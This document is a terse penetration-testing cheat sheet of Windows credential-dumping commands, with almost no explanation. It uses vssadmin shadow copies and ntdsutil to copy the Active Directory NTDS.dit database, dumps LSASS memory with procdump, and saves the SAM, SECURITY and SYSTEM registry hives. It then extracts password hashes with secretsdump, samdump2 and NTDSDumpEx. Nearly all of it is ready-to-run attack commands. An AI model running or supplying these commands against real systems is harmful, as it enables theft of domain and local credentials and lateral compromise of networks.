### vssadmin

```

vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system  SYSTEM LOCAL
```

### ntdsutil
#Two new folders will be generated: Active Directory and Registry. 
```
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```

### Procdump
```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
minidump.exe lsass.dmp
```
### LSA 
```
reg save hklm\sam c:\Users\Public\sam.save
reg save hklm\security c:\Users\Public\security.save
reg save hklm\system c:\Users\Public\system.save

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL 
secretsdump.py -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save LOCAL

reg save hklm\sam sam.hiv
reg save hklm\system system.hiv
samdump2 system.hiv sam.hiv > hash.txt
```


```
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\

Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy 

NTDSDumpEx.exe -d C:\ntds.dit -s C:\SYSTEM
```
